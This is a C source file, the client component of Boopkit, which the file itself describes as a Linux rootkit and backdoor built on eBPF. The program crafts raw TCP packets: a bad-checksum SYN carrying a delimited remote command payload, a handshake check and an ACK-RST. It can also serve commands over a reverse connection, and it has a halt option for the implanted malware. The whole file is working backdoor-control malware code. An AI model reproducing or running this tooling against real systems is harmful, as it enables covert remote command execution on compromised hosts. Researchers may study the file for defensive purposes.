// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
#include <arpa/inet.h>
#include <errno.h>
#include <linux/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

// clang-format off
#include "../boopkit.h"
#include "../common.h"
#include "packets.h"
// clang-format on

// TCP requires a client host and port set in order to create a
// proper TCP connection.
// In the event boopkit-boop does have one set, we default
//
#define DEFAULT_LPORT "80"
#define DEFAULT_LHOST "127.0.0.1"

void usage() {
  asciiheader();
  boopprintf("\nBoopkit. (Client program)\n");
  boopprintf("Linux rootkit and backdoor. Built using eBPF.\n");
  boopprintf("\n");
  boopprintf("Usage: \n");
  boopprintf("boopkit-boop [options]\n");
  boopprintf("\n");
  boopprintf("Options:\n");
  boopprintf("-lhost             Local  (src) address   : 127.0.0.1.\n");
  boopprintf("-lport             Local  (src) port      : 3535\n");
  boopprintf("-rhost             Remote (dst) address   : 127.0.0.1.\n");
  boopprintf("-rport             Remote (dst) port      : 22\n");
  boopprintf("-9, halt/kill      Kill the boopkit malware on a server.\n");
  boopprintf("-c, command        Remote command to exec : ls -la\n");
  boopprintf("-h, help           Print help and usage.\n");
  boopprintf("-q, quiet          Disable output.\n");
  boopprintf("-r, reverse-conn   Serve the RCE on lhost:lport after a boop.\n");
  boopprintf("-x, syn-only       Send a single SYN packet with RCE payload.\n");
  boopprintf("\n");
  exit(0);
}

/**
 * config is the CLI options that are used throughout boopkit
 */
struct config {
  // metasploit inspired flags
  char rhost[INET_ADDRSTRLEN];
  char rport[MAX_ARG_LEN];
  char lhost[INET_ADDRSTRLEN];
  char lport[MAX_ARG_LEN];
  char rce[MAX_RCE_SIZE];
  int halt;
  int reverseconn;
  int synonly;
} cfg;

/**
 * clisetup is used to initalize the program from the command line
 *
 * @param argc
 * @param argv
 */
void clisetup(int argc, char **argv) {
  strncpy(cfg.lhost, DEFAULT_LHOST, INET_ADDRSTRLEN);
  strncpy(cfg.lport, DEFAULT_LPORT, MAX_ARG_LEN);
  strncpy(cfg.rhost, "127.0.0.1", INET_ADDRSTRLEN);
  strncpy(cfg.rport, "22", MAX_ARG_LEN);
  strncpy(cfg.rce, "ls -la", MAX_RCE_SIZE);
  cfg.halt = 0;
  cfg.reverseconn = 0;
  cfg.synonly = 0;
  for (int i = 0; i < argc; i++) {
    if (strncmp(argv[i], "-lport", 32) == 0 && argc >= i + 1) {
      strncpy(cfg.lport, argv[i + 1], MAX_ARG_LEN);
    }
    if (strncmp(argv[i], "-rport", 32) == 0 && argc >= i + 1) {
      strncpy(cfg.rport, argv[i + 1], MAX_ARG_LEN);
    }
    if (strncmp(argv[i], "-lhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1) {
      strncpy(cfg.lhost, argv[i + 1], MAX_ARG_LEN);
    }
    if (strncmp(argv[i], "-rhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1) {
      strncpy(cfg.rhost, argv[i + 1], MAX_ARG_LEN);
    }
    if (argv[i][0] == '-') {
      switch (argv[i][1]) {
        case 'h':
          usage();
          break;
        case 'c':
          strncpy(cfg.rce, argv[i + 1], MAX_RCE_SIZE);
          break;
        case 'q':
          quiet = 1;
          break;
        case 'r':
          cfg.reverseconn = 1;
          break;
        case 'x':
          cfg.synonly = 1;
          break;
        case '9':
          cfg.halt = 1;
          break;
      }
    }
  }
}

/**
 * uid_check is used to check the runtime construct of boopkit
 *
 * Ideally boopkit is ran without sudo as uid=0 (root)
 *
 * @param argc
 * @param argv
 */
void uid_check(int argc, char **argv) {
  long luid = (long)getuid();
  if (luid != 0) {
    boopprintf("  XX Invalid UID.\n");
    boopprintf("  XX Permission denied.\n");
    exit(1);
  }
}

/**
 * serverce is a last resort attempt to serve an RCE from a
 * boopkit-boop client.
 *
 * This can be opted-in by passing -r to boopkit.
 *
 * @param listenstr
 * @param rce
 * @return
 */
int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
  struct sockaddr_in laddr;
  int one = 1;
  const int *oneval = &one;
  laddr.sin_family = AF_INET;
  laddr.sin_port = htons(PORT);
  if (inet_pton(AF_INET, listenstr, &laddr.sin_addr) != 1) {
    boopprintf(" XX Listen IP configuration failed.\n");
    return 1;
  }
  int servesock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (servesock == -1) {
    boopprintf(" XX Socket creation failed\n");
    return 1;
  }
  if (setsockopt(servesock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, oneval,
                 sizeof oneval)) {
    boopprintf(" XX Socket option SO_REUSEADDR | SO_REUSEPORT failed\n");
    return 1;
  }
  if (bind(servesock, (struct sockaddr *)&laddr, sizeof laddr) < 0) {
    boopprintf(" XX Socket bind failure: %s\n", listenstr);
    return 1;
  }
  //   n=1 is the number of clients to accept before we begin refusing clients!
  if (listen(servesock, 1) < 0) {
    boopprintf(" XX Socket listen failure: %s\n", listenstr);
    return 1;
  }
  int clientsock;
  int addrlen = sizeof laddr;
  if ((clientsock = accept(servesock, (struct sockaddr *)&laddr,
                           (socklen_t *)&addrlen)) < 0) {
    boopprintf(" XX Socket accept failure: %s\n", listenstr);
    return 1;
  }
  send(clientsock, rce, MAX_RCE_SIZE, 0);
  return 0;
}

/**
 * main
 *
 * @param argc
 * @param argv
 * @return
 */
int main(int argc, char **argv) {
  int one = 1;
  const int *oneval = &one;
  clisetup(argc, argv);
  asciiheader();
  uid_check(argc, argv);
  srand(time(NULL));

  // Configure daddr fields sin_port, sin_addr, sin_family
  struct sockaddr_in daddr;
  daddr.sin_family = AF_INET;
  daddr.sin_port = htons(atoi(cfg.rport));
  if (inet_pton(AF_INET, cfg.rhost, &daddr.sin_addr) != 1) {
    boopprintf("Destination IP configuration failed\n");
    return 1;
  }

  // Configure saddr fields, sin_port, sin_addr, sin_family
  struct sockaddr_in saddr;
  saddr.sin_family = AF_INET;
  saddr.sin_port = htons(rand() % 65535);  // random client port
  if (inet_pton(AF_INET, cfg.lhost, &saddr.sin_addr) != 1) {
    boopprintf("Source IP configuration failed\n");
    return 1;
  }

  // Validate members to stdout
  char daddrstr[INET_ADDRSTRLEN];
  char saddrstr[INET_ADDRSTRLEN];
  inet_ntop(AF_INET, &daddr.sin_addr, daddrstr, sizeof daddrstr);
  inet_ntop(AF_INET, &saddr.sin_addr, saddrstr, sizeof saddrstr);

  char *packet;
  char payload[MAX_RCE_SIZE];
  if (cfg.halt) {
    cfg.reverseconn = 0;
    strncpy(cfg.rce, BOOPKIT_RCE_CMD_HALT,
            MAX_RCE_SIZE);  // Overwrite command with halt command!
  }
  sprintf(payload, "%s%s%s", BOOPKIT_RCE_DELIMITER, cfg.rce,
          BOOPKIT_RCE_DELIMITER);

  // Echo vars
  boopprintf("  -> *[RCE]     : %s\n", cfg.rce);
  boopprintf("  -> *[Local]   : %s:%s\n", cfg.lhost, cfg.lport);
  boopprintf("  -> *[Remote]  : %s:%s\n", cfg.rhost, cfg.rport);
  printf("================================================================\n");

  // ===========================================================================
  // 1. Bad checksum SYN SOCK_RAW (Connectionless)
  //
  // Send a bad TCP checksum packet to any TCP socket. Regardless if a server
  // is running. The kernel will still trigger a bad TCP checksum event.
  //
  // Note: This is a connectionless SYN packet over SOCK_RAW which allows us to
  // do our dirty work.
  //
  // [Socket] SOCK_RAW Reliably-delivered messages over connectionless socket!
  int sock1 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sock1 == -1) {
    boopprintf("Socket SOCK_RAW creation failed\n");
    return 1;
  }
  // [Socket] IP_HDRINCL Header Include
  if (setsockopt(sock1, IPPROTO_IP, IP_HDRINCL, oneval, sizeof(one)) == -1) {
    boopprintf("Unable to set socket option [IP_HDRINCL]\n");
    return 1;
  }
  // [SYN] Send a packet with a 0 checksum!
  int packet_len;

  // Create a malformed TCP packet with an arbitrary command payload attached to
  // the packet.
  create_bad_syn_packet_payload(&saddr, &daddr, &packet, &packet_len, payload);
  int sent;
  sent = sendto(sock1, packet, packet_len, 0, (struct sockaddr *)&daddr,
                sizeof(struct sockaddr));
  if (sent == -1) {
    boopprintf("Unable to send bad checksum SYN packet over SOCK_RAW.\n");
    return 2;
  }
  boopprintf("  -> [%03d bytes]   TX SYN     : %s (SOCK_RAW, RCE, *bad csum)\n", sent,
             cfg.rhost, cfg.rport);
  close(sock1);
  // ===========================================================================

  if (cfg.synonly) {
    printf("================================================================\n");
    return 0;
  }

  // ===========================================================================
  // 2. TCP SOCK_STREAM Connection
  //
  // Here we have a connection based socket. This connection is not required
  // for a "boop". However, we use this to validate we can truly communicate
  // with the backend server. A failure to configure a SOCK_STREAM socket
  // against a boop, can indicate we aren't just firing into the abyss.
  //
  // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
  int sock2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sock2 == -1) {
    boopprintf("Socket creation failed\n");
    return 1;
  }
  if (connect(sock2, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
    boopprintf("Connection SOCK_STREAM refused.\n");
    return 2;
  }
  boopprintf("  -> [handshake]   CONN       : %s:%s\n", cfg.rhost, cfg.rport);
  close(sock2);
  // ===========================================================================

  // ===========================================================================
  // 3. TCP Reset SOCK_RAW
  //
  // This is the 3rd mechanism we use to boop a server.
  // Here we complete a TCP handshake, however we also flip the RST header bit
  // in the hopes of trigger a TCP reset via a boop TCP service.
  //
  // The first bad checksum approach will fail blindly due to the nature of raw
  // sockets. This is a much more reliable boop, however it comes with more
  // risk as it boops through an application.
  //
  // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
  int sock3 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sock3 == -1) {
    boopprintf("Socket SOCK_RAW creation failed\n");
    return 1;
  }
  // [Socket] IP_HDRINCL Header Include
  if (setsockopt(sock3, IPPROTO_IP, IP_HDRINCL, oneval, sizeof(one)) == -1) {
    boopprintf("Unable to set socket option [IP_HDRINCL]\n");
    return 1;
  }
  create_syn_packet(&saddr, &daddr, &packet, &packet_len);
  if ((sent = sendto(sock3, packet, packet_len, 0, (struct sockaddr *)&daddr,
                     sizeof(struct sockaddr))) == -1) {
    boopprintf("Unable to send RST over SOCK_STREAM.\n");
    return 2;
  }
  boopprintf("  -> [%03d bytes]   TX SYN     : %s:%s\n", sent, cfg.rhost,
             cfg.rport);
  char recvbuf[DATAGRAM_LEN];
  int received = receive_from(sock3, recvbuf, sizeof(recvbuf), &saddr);
  if (received <= 0) {
    boopprintf("Unable to receive SYN-ACK over SOCK_STREAM.\n");
    return 3;
  }
  boopprintf("  <- [%03d bytes]   RX SYN-ACK : %s:%s (RCE)\n", received,
             cfg.rhost, cfg.rport);
  uint32_t seq_num, ack_num;
  read_seq_and_ack(recvbuf, &seq_num, &ack_num);
  int new_seq_num = seq_num + 1;
  create_ack_rst_packet(&saddr, &daddr, ack_num, new_seq_num, &packet,
                        &packet_len);
  if ((sent = sendto(sock3, packet, packet_len, 0, (struct sockaddr *)&daddr,
                     sizeof(struct sockaddr))) == -1) {
    boopprintf("Unable to send ACK-RST over SOCK_STREAM.\n");
    return 2;
  }
  boopprintf("  -> [%03d bytes]   TX ACK-RST : %s:%s\n", sent, cfg.rhost,
             cfg.rport);
  close(sock3);
  // ===========================================================================

  if (cfg.reverseconn) {
    boopprintf("  -> [hanging..]   CONN       : %s:%s (listen...)\n", cfg.lhost,
               cfg.lport);
    int errno;
    errno = serverce(saddrstr, cfg.rce);
    if (errno != 0) {
      boopprintf(" Error serving RCE!\n");
    }
  }

  printf("================================================================\n");
  return 0;
}
